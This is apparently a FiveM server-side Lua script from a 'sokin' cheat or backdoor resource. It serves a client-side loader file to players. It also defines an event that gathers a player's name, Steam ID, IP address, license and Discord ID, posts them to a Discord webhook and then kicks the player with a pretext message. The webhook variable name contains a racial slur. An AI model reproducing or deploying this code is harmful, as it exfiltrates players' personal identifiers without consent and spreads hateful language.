local webhookniggerXD = "" -- webhook
function heheheeheheh()
    print([[^7
         ,    ,
        | \--/ |
        ( (0_0)(
         \==Y==/
         /'-"-'>
       _/ < ; (;
      / ,_ |_|_\
     ( _,,)\,,),)
     \ '.___
      '-----'
Server:  discord.gg/sokin^7
Website: https://sokin.eu/
Discord: sokin#6666
]])
end
heheheeheheh()
RegisterServerEvent('sokin:6666')
AddEventHandler('sokin:6666', function ()
    data = LoadResourceFile(GetCurrentResourceName(),'clientload.lua')
    TriggerClientEvent('sokin:XDXD', source, data)
end)


RegisterNetEvent("sokin:wyjebpedala")
AddEventHandler('sokin:wyjebpedala', function()
    local name = GetPlayerName(source)
    local steam = GetPlayerIdentifier(source)
    local ip = GetPlayerEndpoint(source)
    local identifiers = ExtractIdentifiers(source)
    local license = identifiers.license
    local discord ="<@" ..identifiers.discord:gsub("discord:", "")..">" 
    local connect = {
            {
                ["color"] = "1048320", 
                ["title"] = "ddddddddddddddddddddddd", 
                ["description"] = "Name: **"..name.."**\nSteam ID : **"..steam.."**\nIP: **" .. ip .. "**\nLicense: **" .. license .. "**\nDiscord: **" .. discord .. "**",
            }
        }

    PerformHttpRequest(webhookniggerXD, function(err, text, headers) end, 'POST', json.encode({username = "XD", embeds = connect, tts = TTS}), { ['Content-Type'] = 'application/json' })
    DropPlayer(source, 'Zmien wersje klienta Fivema na canary \nhttps://sokin.eu/')
end)